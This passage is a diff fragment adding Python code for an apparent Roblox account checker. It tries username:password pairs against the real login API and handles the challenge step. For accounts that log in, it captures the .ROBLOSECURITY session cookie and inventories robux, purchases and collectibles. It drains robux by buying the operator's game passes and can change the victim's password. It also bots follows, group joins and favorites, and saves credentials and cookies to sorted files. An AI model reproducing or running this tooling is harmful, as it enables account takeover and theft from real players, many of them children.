"timestamp": 10658}}, {{"x": 989, "y": 503, "timestamp": 10682}}], "screenSize": {{"width": 1920, "height": 1080}}, "buttonLocation": {{"x": 780, "y": 495.1875, "width": 360, "height": 48}}, "windowSize": {{"width": 1920, "height": 951}}, "isMobile": false}}}}'
+
+                r = session.post(url="https://apis.roblox.com/rostile/v1/verify", headers=headers, data=payload)
+                response_json = r.json()
+                redemption_token = response_json.get('redemptionToken')
+
+                redemption_token_json = json.dumps({"redemptionToken": redemption_token}, separators=(',', ':'))
+
+                redemption_token_b64 = base64.b64encode(redemption_token_json.encode('utf-8')).decode('utf-8')
+
+                payloade = {
+                    "challengeId": f"{challenge_id}",
+                    "challengeType": "rostile",
+                    "challengeMetadata": f"{{\"redemptionToken\":\"{redemption_token}\"}}"
+                }
+                headz = {
+                    "accept": "application/json, text/plain, */*",
+                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-language": "en-US,en;q=0.9",
+                    "content-type": "application/json;charset=UTF-8",
+                    "cookie": "__utmz=200924205.1728367660.35.3.utmcsr=bing|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _ga=GA1.1.539305494.1728048570; _ga_BK4ZY0C59K=GS1.1.1728472224.5.0.1728472226.0.0.0; _ga_F8VP9T1NT3=GS1.1.1728486979.24.0.1728486979.0.0.0; .RBXIDCHECK=d7bd4fd7-02ac-4b78-b64e-869d7615641c; GuestData=UserID=-1931803406; RBXSource=rbx_acquisition_time=10/03/2024 12:24:34&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Social&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=0; RBXEventTrackerV2=CreateDate=10/09/2024 12:40:59&rbxid=103770979&browserid=1728491665797002; rbx-ip2=1; RBXImageCache=timg=PB9JtliDjaC38pqV56NsqA2GdVu7BNJ4hg3qouIYXCkQRkpvRziistt8A_xpffQ2StiFwj1aMP5PBlmsrE7DaCReReGc6wGBLETybFBvKdWUqfWpoDbuJ9aoRoYQRQZEVZy9z4Ul3EoKV75ftRKv5eqz7_zqYD_gqDmx_XVJpVqgYoIh2Mqt3WIWFTdmy7PH4iAOZeGbrCL5Ght8r2nWcQ; __utma=200924205.175322198.1727958290.1728500488.1728899975.49; __utmb=200924205.0.10.1728899975; __utmc=200924205",
+                    "origin": "https://www.roblox.com",
+                    "priority": "u=1, i",
+                    "referer": "https://www.roblox.com/",
+                    "sec-ch-ua": "\"Microsoft Edge\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": "\"Windows\"",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-site",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
+                    "x-csrf-token": "cbKWqljO8zd5"
+                }
+                continu = session.post(url="https://apis.roblox.com/challenge/v1/continue", headers=headz,
+                                       json=payloade)
+
+                headers_login['rblx-challenge-metadata'] = redemption_token_b64
+                headers_login['rblx-challenge-type'] = 'rostile'
+                headers_login['rblx-challenge-id'] = challenge_id
+                headers_login["x-retry-attempt"] = "1"
+
+                final = session.post(url="https://auth.roblox.com/v2/login", headers=headers_login, json=login_payload)
+                if "Token Validation Failed" in final.text:
+                    headers_login['X-Csrf-Token'] = response_login.headers.get('x-csrf-token')
+                    response_login = session.post(login_url, json=login_payload, headers=headers_login)
+
+                if "twoStepVerificationData" in final.text:
+                    save_to_file(twofa_file, f"{user}:{password}\n")
+                    Logger.Log("2FA", "2FA found", Colors.yellow, Username=user)
+                    return
+
+                if "displayName" in final.text or "An unexpected" in final.text:
+                    with lock:
+                        hits += 1
+                    if uistyle == 1:
+                        Logger.Log("VALID", "Valid account", Colors.green, Username=user)
+                    else:
+                        pass
+
+                    response_data = json.loads(final.text)
+                    user_id = response_data['user']['id']
+                    roblosecurity_cookie = session.cookies.get('.ROBLOSECURITY')
+
+                    robux = "Failed"
+                    country = "Failed"
+
+                    headers_robux = {
+                        "Accept": "application/json, text/plain, */*",
+                        "Accept-Encoding": "gzip, deflate, br, zstd",
+                        "Accept-Language": "en-US,en;q=0.9",
+                        "Cookie": f".ROBLOSECURITY={roblosecurity_cookie}",
+                        "Origin": "https://www.roblox.com",
+                        "Referer": "https://www.roblox.com/",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+                    }
+
+                    robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
+
+                    if dorobux == True:
+                        for attempt in range(max_retries):
+                            try:
+                                robux_res = session.get(url=robux_url, headers=headers_robux)
+                                if robux_res.status_code == 200:
+                                    response_data = json.loads(robux_res.text)
+                                    robux = response_data.get('robux', "Failed")
+                                    robucx += robux
+                                    break
+                            except Exception as e:
+                                print(e)
+                            if attempt < max_retries - 1:
+                                time.sleep(retry_delay)
+                    else:
+                        robux = "Not captured"
+
+                    if docountry == True:
+                        for attempt in range(1, 4):
+                            try:
+                                url = "https://accountsettings.roblox.com/v1/account/settings/account-country"
+                                res = session.get(url, headers=headers_robux)
+                                if res.status_code == 200:
+                                    data = json.loads(res.text)
+                                    country = data['value']['countryName']
+                                    break
+                            except Exception as e:
+                                pass
+                    else:
+                        country = "Not captured"
+
+                    currencyurl = f"https://economy.roblox.com/v2/users/{user_id}/transactions?cursor=&limit=100&transactionType=CurrencyPurchase&itemPricingType=PaidAndLimited"
+                    total_currency_purchased = 0
+
+                    HasKorblox = "Unknown"
+                    HasHeadless = "Unknown"
+
+                    if dokorblox:
+                        try:
+                            url = f"https://catalog.roblox.com/v1/users/{user_id}/bundles/1?cursor=&limit=100&sortOrder=Desc"
+                            r = session.get(url, headers=headers_robux)
+                            if "Korblox Deathspeaker" in r.text:
+                                HasKorblox = True
+                            else:
+                                HasKorblox = False
+                            if "Headless Horseman" in r.text:
+                                HasHeadless = True
+                            else:
+                                HasHeadless = False
+                        except Exception as e:
+                            HasKorblox = "Unknown"
+                            HasHeadless = "Unknown"
+                            print(e)
+
+                    Joinedgroup = "Unknown"
+
+                    if dogroupjoin:
+                        url = f"https://groups.roblox.com/v1/groups/{groupid}/users"
+                        payloaz = '{"sessionId":"","redemptionToken":""}'
+                        r = session.post(url, headers=headers_robux, json=payloaz)
+                        if "Token" in r.text:
+                            headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                            r = session.post(url, headers=headers_robux, json=payloaz)
+                            if r.text == "{}":
+                                Joinedgroup = True
+                            elif r.status_code == 403:
+                                Joinedgroup = "Captcha"
+                        if r.text == "{}":
+                            Joinedgroup = True
+                        if r.status_code == 403:
+                            Joinedgroup = "Captcha"
+
+                    BottedAsset = "Unknown"
+
+                    if doassetbot:
+                        for _ in assetid:
+                            assetlink = f"https://catalog.roblox.com/v1/favorites/users/{user_id}/assets/{_}/favorite"
+                            r = session.post(assetlink, headers=headers_robux)
+                            if r.text == '{}':
+                                BottedAsset = True
+                            if r.status_code == 403:
+                                BottedAsset = "Captcha"
+                            if "Token" in r.text:
+                                headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                                r = session.post(assetlink, headers=headers_robux)
+                                if r.text == '{}':
+                                    BottedAsset = True
+                                if r.status_code == 403:
+                                    BottedAsset = "Captcha"
+                                else:
+                                    BottedAsset = True
+                            else:
+                                BottedAsset = True
+
+                    if dostealrbx and dorobux:
+                        try:
+                            robux = int(robux)
+
+                            gamepass_options = {
+                                (2, 5): (GamePassId2, 2),
+                                (5, 10): (GamePassId5, 5),
+                                (10, 25): (GamePassId10, 10),
+                                (25, 50): (GamePassId25, 25),
+                                (50, 75): (GamePassId50, 50),
+                                (75, 100): (GamePassId75, 75),
+                                (100, 150): (GamePassId100, 100),
+                                (150, 175): (GamePassId150, 150),
+                                (175, 200): (GamePassId175, 175),
+                                (200, 250): (GamePassId200, 200),
+                                (250, float('inf')): (GamePassId250, 250),
+                            }
+
+                            selected_pass = next(
+                                ((id, price) for (low, high), (id, price) in gamepass_options.items() if
+                                 low <= robux < high),
+                                None)
+
+                            if selected_pass is None:
+                                boughtrbx2 = "Biedak bez kasy"
+
+                            GamePassId, expected_price = selected_pass
+
+                            url = f"https://apis.roblox.com/game-passes/v1/game-passes/{GamePassId}/purchase"
+                            payload = {"expectedCurrency": 1, "expectedPrice": expected_price,
+                                       "expectedSellerId": SellerId}
+
+                            response = session.post(url, headers=headers_robux, json=payload)
+                            print(response.text)
+
+                            if "token" in response.text:
+                                try:
+                                    headers_robux["x-csrf-token"] = response.headers["x-csrf-token"]
+                                except Exception as e:
+                                    print(e)
+
+                                response = session.post(url, headers=headers_robux, json=payload)
+
+                                if "Success" in response.text:
+                                    boughtrbx2 = True
+                                elif response.status_code in (400, 403):
+                                    boughtrbx2 = "Failed"
+                                else:
+                                    boughtrbx2 = "Unknown response"
+
+                            if "Success" in response.text:
+                                boughtrbx2 = True
+                            elif response.status_code in (400, 403):
+                                boughtrbx2 = "Failed"
+                            else:
+                                boughtrbx2 = "Unknown response"
+
+                        except Exception as e:
+                            print(e)
+                            boughtrbx2 = "error"
+
+                    balancecredits = "e"
+                    balancecurrency = "e"
+
+                    if docredits:
+                        try:
+                            r = session.get(url="https://apis.roblox.com/credit-balance/v1/get-credit-balance")
+                            if r.status_code == 404:
+                                balancecredits = "No credits"
+                                balancecurrency = "No credits"
+                            if r.status_code == 200:
+                                gayson = r.json()
+                                balancecredits = gayson["creditBalance"]
+                                balancecurrency = gayson["currencyCode"]
+                            else:
+                                print(r.text)
+                                balancecredits = "None"
+                                balancecurrency = "None"
+                        except Exception:
+                            pass
+
+                    if dototal_robux == True:
+                        try:
+                            while True:
+                                response = session.get(currencyurl, headers=headers_robux)
+                                data = json.loads(response.text)
+                                if "data" in data and data["data"]:
+                                    transactions = data["data"]
+                                    for transaction in transactions:
+                                        if "currency" in transaction and "amount" in transaction["currency"]:
+                                            total_currency_purchased += transaction["currency"]["amount"]
+                                            totalrbx += total_currency_purchased
+                                cursor = data.get("nextPageCursor", None)
+                                if not cursor:
+                                    break
+                        except Exception as e:
+                            print(e)
+                            total_currency_purchased = "Failed"
+                    else:
+                        total_currency_purchased = "Not captured"
+
+                    createdat = "Unknown"
+                    if dojoin_date == True:
+                        try:
+                            userurl = f"https://users.roblox.com/v1/users/{user_id}"
+                            usar = session.get(userurl, headers=headers_robux)
+                            if usar.status_code == 200:
+                                data = json.loads(usar.text)
+                                createdat = data["created"]
+                        except Exception as e:
+                            createdat = "Failed"
+                    else:
+                        country = "Not captured"
+
+                    premium = "Unknown"
+                    if dopremium == True:
+                        try:
+                            membershipurl = f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership"
+                            meb = session.get(membershipurl, headers=headers_robux)
+                            if meb.status_code == 200:
+                                premium = meb.text
+                        except Exception as e:
+                            premium = "Failed"
+                    else:
+                        premium = "Not captured"
+
+                    rap = 0
+                    url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100'
+                    if dorap == True:
+                        try:
+                            request = session.get(url, headers=headers_robux).json()
+                            rap += sum(item.get('recentAveragePrice', 0) for item in request.get('data', []))
+                            url = request.get('nextPageCursor', None)
+                            if url:
+                                url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100&cursor={url}'
+                        except Exception as e:
+                            rap = "Failed"
+                    else:
+                        rap = "Not captured"
+
+                    followed = "Unknown"
+
+                    if dofollow == True:
+                        try:
+                            followurl = f"https://friends.roblox.com/v1/users/{followid}/follow"
+                            headers_robux["x-csrf-token"] = csrf_token
+                            re = session.post(followurl, headers=headers_robux)
+
+                            if "Token Val" in re.text:
+                                new_csrf_token = re.headers.get("x-csrf-token")
+                                if new_csrf_token:
+                                    headers_robux["x-csrf-token"] = new_csrf_token
+                                    re = session.post(followurl, headers=headers_robux)
+                                    if 'success":true' in re.text:
+                                        followed = "True"
+                                    if 'isCaptchaRequired":true':
+                                        followed = "Captcha"
+                                else:
+                                    if 'success":true' in re.text:
+                                        followed = "True"
+                                    if 'isCaptchaRequired":true':
+                                        followed = "Captcha"
+                            if 'success":true' in re.text:
+                                followed = "True"
+                        except Exception as e:
+                            followed = "Failed"
+                    else:
+                        followed = "Not captured"
+
+                    capgamepassurl = f"https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=1000&pageNumber=1&userId={user_id}"
+
+                    gppricing = 0
+                    petsgogpcount = 0
+                    ps99gpcount = 0
+                    mm2gpcount = 0
+                    adoptmegpcount = 0
+
+                    if dogp:
+                        gppricing = 0
+                        petsgogpcount = 0
+                        ps99gpcount = 0
+                        mm2gpcount = 0
+                        adoptmegpcount = 0
+                        gpcaount = "created by gyew"
+
+                        ps99gps = [
+                            "Lucky! 🍀",
+                            "Ultra Lucky! 🍀✨",
+                            "VIP! ⭐",
+                            "Magic Eggs! ✨",
+                            "+15 Pets! 🐾",
+                            "Huge Hunter! 🔥",
+                            "Auto Farm! ♻️",
+                            "Auto Tap! ☝️",
+                            "Daycare Slots! 💖",
+                            "+15 Eggs! 🥚",
+                            "Super Drops! ⭐",
+                            "Double Stars"
+                        ]
+
+                        adoptmegps = [
+                            "VIP",
+                            "Premium Plots",
+                            "Millionaire Pack",
+                            "Celebrity Mansion",
+                            "Modern Mansion",
+                            "Hotdog Stand",
+                            "Cozy Home Lure",
+                            "Fossil Isle Returns Bundle",
+                            "Soccer Stadium",
+                            "School and Hospital Homes"
+                        ]
+
+                        mm2gps = [
+                            "Elite",
+                            "Radio",
+                            "GODLY: Spirit",
+                            "GODLY: Soul",
+                            "BUNDLE: Spirit & Soul"
+                        ]
+
+                        petsgogps = [
+                            "VIP! 👑",
+                            "Ultra Lucky! 💎",
+                            "Lucky! 🍀",
+                            "Hyper Dice! ⚡",
+                            "Double Dice! 🎲🎲",
+                            "Double Coins! 💰",
+                            "+3 Pets! 🐾"
+                        ]
+
+                        try:
+                            getcapgp = session.get(capgamepassurl, headers=headers_robux)
+
+                            if getcapgp.status_code == 200:
+                                gamepass_data = getcapgp.json()
+
+                                if 'Data' in gamepass_data:
+                                    for item in gamepass_data['Data'].get("Items", []):
+                                        price = item.get("Product", {}).get("PriceInRobux", 0)
+                                        gppricing += price
+
+                                        item_name = item["Item"]["Name"]
+                                        creator_name = item["Creator"]["Name"]
+
+                                        if dops99gp and (item_name in ps99gps or creator_name == "BIG Games Pets"):
+                                            ps99gpcount += 1
+                                            gppricing += price
+
+                                        if item_name in mm2gps and creator_name == "Nikilis":
+                                            mm2gpcount += 1
+                                            gppricing += price
+
+                                        if item_name in petsgogps and creator_name == "BIG Games Pets":
+                                            petsgogpcount += 1
+                                            gppricing += price
+
+                                        if item_name in adoptmegps and creator_name == "Uplift Games":
+                                            adoptmegpcount += 1
+                                            gppricing += price
+
+                                else:
+                                    petsgogpcount = 0
+                                    ps99gpcount = 0
+                                    mm2gpcount = 0
+                                    adoptmegpcount = 0
+                                    gppricing = 0
+
+                            else:
+                                petsgogpcount = "Failed"
+                                ps99gpcount = "Failed"
+                                mm2gpcount = "Failed"
+                                adoptmegpcount = "Failed"
+                                gppricing = "Failed"
+
+                        except Exception:
+                            pass
+
+                    if dopswchange:
+                        try:
+                            url = "https://auth.roblox.com/v2/user/passwords/change"
+                            pay = {
+                                "currentPassword": password,
+                                "newPassword": password1
+                            }
+                            r = session.post(url, headers=headers_robux, json=pay)
+                            print(r.text)
+                            if "XSRF" or "Token" in r.text:
+                                headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                                r = session.post(url, headers=headers_robux, json=pay)
+                                print(r.text)
+                                if r.text == "{}":
+                                    changedpassword = True
+                            elif r.text == "{}":
+                                changedpassword = True
+                            elif "Challenge" in r.text:
+                                changedpassword = "Captcha"
+                        except Exception:
+                            changedpassword = "Error"
+
+                    if docookie == True:
+                        capcook = True
+                    else:
+                        capcook = False
+
+                    final_data = f"{user}:{password} | "
+
+                    if dorobux:
+                        final_data += f"Robux: {robux} | "
+                    if docountry:
+                        final_data += f"Country: {country} | "
+                    if dototal_robux:
+                        final_data += f"Purchased Robux: {total_currency_purchased} | "
+                    if dorap:
+                        final_data += f"RAP: {rap} | "
+                    if dopremium:
+                        final_data += f"Premium: {premium} | "
+                    if dojoin_date:
+                        final_data += f"Registered at: {createdat} | "
+                    if dofollow:
+                        final_data += f"Followed acc: {followed} | "
+                    if dogp:
+                        final_data += f"Total gamepass prices: {gppricing} | "
+                    if dops99gp:
+                        final_data += f"Total ps99 gamepasses: {ps99gpcount} | "
+                    if dopetsgogp:
+                        final_data += f"Total pets go gamepasses: {petsgogpcount} | "
+                    if domm2:
+                        final_data += f"Total mm2 gamepasses: {mm2gpcount} | "
+                    if doadoptmegp:
+                        final_data += f"Total adoptme gamepasses: {adoptmegpcount} | "
+                    if dokorblox:
+                        final_data += f"Has korblox: {HasKorblox} | "
+                    if dokorblox:
+                        final_data += f"Has headless: {HasHeadless} | "
+                    if dogroupjoin:
+                        final_data += f"Joined group: {Joinedgroup} | "
+                    if doassetbot:
+                        final_data += f"Botted asset favorites: {BottedAsset} | "
+                    if docredits:
+                        final_data += f"Credit balance: {balancecredits} | "
+                    if docredits:
+                        final_data += f"Credit currency: {balancecurrency} | "
+                    if docookie:
+                        final_data += f".ROBLOSECURITY: {roblosecurity_cookie} | "
+
+                    final_data = final_data.rstrip(" | ") + "\n"
+
+                    try:
+                        save_to_file(valid_file, final_data)
+
+                        if is_valid_bool(HasKorblox) is True:
+                            save_to_file(korbloxfile, final_data)
+
+                        if is_valid_bool(HasHeadless) is True:
+                            save_to_file(headlessfile, final_data)
+
+                        rap_value = is_valid_int(rap)
+                        if rap_value is not None:
+                            if 1 <= rap_value <= 1000:
+                                save_to_file(rapfile1, final_data)
+                            elif rap_value > 1000:
+                                save_to_file(rapfile2, final_data)
+
+                        ps99gp_value = is_valid_int(ps99gpcount)
+                        if ps99gp_value is not None and ps99gp_value > 1:
+                            save_to_file(ps99file, final_data)
+
+                        adoptmegp_value = is_valid_int(adoptmegpcount)
+                        if adoptmegp_value is not None and adoptmegp_value > 1:
+                            save_to_file(adoptmefile, final_data)
+
+                        mm2gp_value = is_valid_int(mm2gpcount)
+                        if mm2gp_value is not None and mm2gp_value > 1:
+                            save_to_file(mm2file, final_data)
+
+                        petsgogp_value = is_valid_int(petsgogpcount)
+                        if petsgogp_value is not None and petsgogp_value > 1:
+                            save_to_file(petsgofile, final_data)
+
+                        credits_value = is_valid_int(balancecredits)
+                        if credits_value is not None and credits_value > 1:
+                            save_to_file(creditsfile, final_data)
+
+                        if is_valid_bool(premium) is True:
+                            save_to_file(premiumfile, final_data)
+
+                        if 1 <= robux < 101:
+                            save_to_file(robuxfile1, final_data)
+                        elif 101 <= robux < 500:
+                            save_to_file(robuxfile2, final_data)
+                        elif 500 <= robux < 1000:
+                            save_to_file(robuxfile3, final_data)
+                        elif 1000 <= robux < 5000:
+                            save_to_file(robuxfile4, final_data)
+                        elif robux >= 10000:
+                            save_to_file(robuxfile5, final_data)
+                    except Exception as e:
+                        print(e)
+
+                    return
+
+                elif "Incorrect" in final.text:
+                    save_to_file(invalid_file, f"{user}:{password}")
+                    Logger.Log("BAD", "Bad credentials", Colors.red, Username=user)
+                    return
+
+                elif "Account has" in final.text:
+                    save_to_file(locked_file, f"{user}:{password}")
+                    Logger.Log("LOCKED", "Accoiunt locked", Colors.cyan, Username=user)
+            else:
+                print("No challenge metadata found.")
+        else:
+            print(response_login.text)
+
+    if "twoStepVerificationData" in response_login.text:
+        with lock:
+            twofac += 1
+        save_to_file(twofa_file, f"{user}:{password}\n")
+        if uistyle == 1:
+            Logger.Log("2FA", "2FA found", Colors.yellow, Username=user)
+        else:
+            pass
+        return
+
+    if "displayName" in response_login.text or "An unexpected" in response_login.text:
+        with lock:
+            hits += 1
+        if uistyle == 1:
+            Logger.Log("VALID", "Valid account", Colors.green, Username=user)
+        else:
+            pass
+
+        response_data = json.loads(response_login.text)
+        user_id = response_data['user']['id']
+        roblosecurity_cookie = session.cookies.get('.ROBLOSECURITY')
+        print(roblosecurity_cookie)
+
+        robux = "Failed"
+        country = "Failed"
+
+        headers_robux = {
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Cookie": f".ROBLOSECURITY={roblosecurity_cookie}",
+            "Origin": "https://www.roblox.com",
+            "Referer": "https://www.roblox.com/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+        }
+
+        robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
+
+        if dorobux == True:
+            for attempt in range(max_retries):
+                try:
+                    robux_res = session.get(url=robux_url, headers=headers_robux)
+                    if robux_res.status_code == 200:
+                        response_data = json.loads(robux_res.text)
+                        robux = response_data.get('robux', "Failed")
+                        robucx += robux
+                        break
+                except Exception as e:
+                    print(e)
+                if attempt < max_retries - 1:
+                    time.sleep(retry_delay)
+        else:
+            robux = "Not captured"
+
+        if docountry == True:
+            for attempt in range(1, 4):
+                try:
+                    url = "https://accountsettings.roblox.com/v1/account/settings/account-country"
+                    res = session.get(url, headers=headers_robux)
+                    if res.status_code == 200:
+                        data = json.loads(res.text)
+                        country = data['value']['countryName']
+                        break
+                except Exception as e:
+                    pass
+        else:
+            country = "Not captured"
+
+        HasKorblox = "Unknown"
+        HasHeadless = "Unknown"
+
+        if dokorblox:
+            try:
+                url = f"https://catalog.roblox.com/v1/users/{user_id}/bundles/1?cursor=&limit=100&sortOrder=Desc"
+                r = session.get(url, headers=headers_robux)
+                if "Korblox Deathspeaker" in r.text:
+                    HasKorblox = True
+                else:
+                    HasKorblox = False
+                if "Headless Horseman" in r.text:
+                    HasHeadless = True
+                else:
+                    HasHeadless = False
+            except Exception as e:
+                HasKorblox = "Unknown"
+                HasHeadless = "Unknown"
+                print(e)
+
+        Joinedgroup = "Unknown"
+
+        if dogroupjoin:
+            url = f"https://groups.roblox.com/v1/groups/{groupid}/users"
+            payloaz = '{"sessionId":"","redemptionToken":""}'
+            r = session.post(url, headers=headers_robux, json=payloaz)
+            if "Token" in r.text:
+                headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                r = session.post(url, headers=headers_robux, json=payloaz)
+                if r.text == "{}":
+                    Joinedgroup = True
+                elif r.status_code == 403:
+                    Joinedgroup = "Captcha"
+            if r.text == "{}":
+                Joinedgroup = True
+            if r.status_code == 403:
+                Joinedgroup = "Captcha"
+
+        currencyurl = f"https://economy.roblox.com/v2/users/{user_id}/transactions?cursor=&limit=100&transactionType=CurrencyPurchase&itemPricingType=PaidAndLimited"
+        total_currency_purchased = 0
+
+        if dototal_robux == True:
+            try:
+                while True:
+                    response = session.get(currencyurl, headers=headers_robux)
+                    data = json.loads(response.text)
+                    if "data" in data and data["data"]:
+                        transactions = data["data"]
+                        for transaction in transactions:
+                            if "currency" in transaction and "amount" in transaction["currency"]:
+                                total_currency_purchased += transaction["currency"]["amount"]
+                                totalrbx += total_currency_purchased
+                    cursor = data.get("nextPageCursor", None)
+                    if not cursor:
+                        break
+            except Exception as e:
+                print(e)
+                total_currency_purchased = "Failed"
+        else:
+            total_currency_purchased = "Not captured"
+
+        BottedAsset = "Unknown"
+
+        if doassetbot:
+            for _ in assetid:
+                assetlink = f"https://catalog.roblox.com/v1/favorites/users/{user_id}/assets/{_}/favorite"
+                r = session.post(assetlink, headers=headers_robux)
+                if r.text == '{}':
+                    BottedAsset = True
+                if r.status_code == 403:
+                    BottedAsset = "Captcha"
+                if "Token" in r.text:
+                    headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                    r = session.post(assetlink, headers=headers_robux)
+                    if r.text == '{}':
+                        BottedAsset = True
+                    if r.status_code == 403:
+                        BottedAsset = "Captcha"
+                    else:
+                        BottedAsset = True
+                else:
+                    BottedAsset = True
+
+        createdat = "Unknown"
+        if dojoin_date == True:
+            try:
+                userurl = f"https://users.roblox.com/v1/users/{user_id}"
+                usar = session.get(userurl, headers=headers_robux)
+                if usar.status_code == 200:
+                    data = json.loads(usar.text)
+                    createdat = data["created"]
+            except Exception as e:
+                createdat = "Failed"
+        else:
+            country = "Not captured"
+
+        if dostealrbx and dorobux:
+            try:
+                robux = int(robux)
+
+                gamepass_options = {
+                    (2, 5): (GamePassId2, 2),
+                    (5, 10): (GamePassId5, 5),
+                    (10, 25): (GamePassId10, 10),
+                    (25, 50): (GamePassId25, 25),
+                    (50, 75): (GamePassId50, 50),
+                    (75, 100): (GamePassId75, 75),
+                    (100, 150): (GamePassId100, 100),
+                    (150, 175): (GamePassId150, 150),
+                    (175, 200): (GamePassId175, 175),
+                    (200, 250): (GamePassId200, 200),
+                    (250, float('inf')): (GamePassId250, 250),
+                }
+
+                selected_pass = next(
+                    ((id, price) for (low, high), (id, price) in gamepass_options.items() if low <= robux < high),
+                    None)
+
+                if selected_pass is None:
+                    boughtrbx2 = "Biedak bez kasy"
+
+                GamePassId, expected_price = selected_pass
+
+                url = f"https://apis.roblox.com/game-passes/v1/game-passes/{GamePassId}/purchase"
+                payload = {"expectedCurrency": 1, "expectedPrice": expected_price, "expectedSellerId": SellerId}
+
+                response = session.post(url, headers=headers_robux, json=payload)
+                print(response.text)
+
+                if "token" in response.text:
+                    try:
+                        headers_robux["x-csrf-token"] = response.headers["x-csrf-token"]
+                    except Exception as e:
+                        print(e)
+
+                    response = session.post(url, headers=headers_robux, json=payload)
+
+                    if "Success" in response.text:
+                        boughtrbx2 = True
+                    elif response.status_code in (400, 403):
+                        boughtrbx2 = "Failed"
+                    else:
+                        boughtrbx2 = "Unknown response"
+
+                if "Success" in response.text:
+                    boughtrbx2 = True
+                elif response.status_code in (400, 403):
+                    boughtrbx2 = "Failed"
+                else:
+                    boughtrbx2 = "Unknown response"
+
+            except Exception as e:
+                print(e)
+                boughtrbx2 = "error"
+
+        balancecredits = "e"
+        balancecurrency = "e"
+
+        if docredits:
+            try:
+                r = session.get(url="https://apis.roblox.com/credit-balance/v1/get-credit-balance")
+                if r.status_code == 404:
+                    balancecredits = "No credits"
+                    balancecurrency = "No credits"
+                if r.status_code == 200:
+                    gayson = r.json()
+                    balancecredits = gayson["creditBalance"]
+                    balancecurrency = gayson["currencyCode"]
+                else:
+                    print(r.text)
+                    balancecredits = "None"
+                    balancecurrency = "None"
+            except Exception:
+                pass
+
+        premium = "Unknown"
+        if dopremium == True:
+            try:
+                membershipurl = f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership"
+                meb = session.get(membershipurl, headers=headers_robux)
+                if meb.status_code == 200:
+                    premium = meb.text
+            except Exception as e:
+                premium = "Failed"
+        else:
+            premium = "Not captured"
+
+        rap = 0
+        url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100'
+        if dorap == True:
+            try:
+                request = session.get(url, headers=headers_robux).json()
+                rap += sum(item.get('recentAveragePrice', 0) for item in request.get('data', []))
+                url = request.get('nextPageCursor', None)
+                if url:
+                    url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100&cursor={url}'
+            except Exception as e:
+                rap = "Failed"
+        else:
+            rap = "Not captured"
+
+        followed = "Unknown"
+
+        if dofollow == True:
+            try:
+                followurl = f"https://friends.roblox.com/v1/users/{followid}/follow"
+                headers_robux["x-csrf-token"] = csrf_token
+                re = session.post(followurl, headers=headers_robux)
+
+                if "Token Val" in re.text:
+                    new_csrf_token = re.headers.get("x-csrf-token")
+                    if new_csrf_token:
+                        headers_robux["x-csrf-token"] = new_csrf_token
+                        re = session.post(followurl, headers=headers_robux)
+                        if 'success":true' in re.text:
+                            followed = "True"
+                        if 'isCaptchaRequired":true':
+                            followed = "Captcha"
+                    else:
+                        if 'success":true' in re.text:
+                            followed = "True"
+                        if 'isCaptchaRequired":true':
+                            followed = "Captcha"
+                if 'success":true' in re.text:
+                    followed = "True"
+            except Exception as e:
+                followed = "Failed"
+        else:
+            followed = "Not captured"
+
+        capgamepassurl = f"https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=1000&pageNumber=1&userId={user_id}"
+
+        gppricing = 0
+        petsgogpcount = 0
+        ps99gpcount = 0
+        mm2gpcount = 0
+        adoptmegpcount = 0
+
+        if dogp:
+            gppricing = 0
+            petsgogpcount = 0
+            ps99gpcount = 0
+            mm2gpcount = 0
+            adoptmegpcount = 0
+
+            ps99gps = [
+                "Lucky! 🍀",
+                "Ultra Lucky! 🍀✨",
+                "VIP! ⭐",
+                "Magic Eggs! ✨",
+                "+15 Pets! 🐾",
+                "Huge Hunter! 🔥",
+                "Auto Farm! ♻️",
+                "Auto Tap! ☝️",
+                "Daycare Slots! 💖",
+                "+15 Eggs! 🥚",
+                "Super Drops! ⭐",
+                "Double Stars"
+            ]
+
+            adoptmegps = [
+                "VIP",
+                "Premium Plots",
+                "Millionaire Pack",
+                "Celebrity Mansion",
+                "Modern Mansion",
+                "Hotdog Stand",
+                "Cozy Home Lure",
+                "Fossil Isle Returns Bundle",
+                "Soccer Stadium",
+                "School and Hospital Homes"
+            ]
+
+            mm2gps = [
+                "Elite",
+                "Radio",
+                "GODLY: Spirit",
+                "GODLY: Soul",
+                "BUNDLE: Spirit & Soul"
+            ]
+
+            petsgogps = [
+                "VIP! 👑",
+                "Ultra Lucky! 💎",
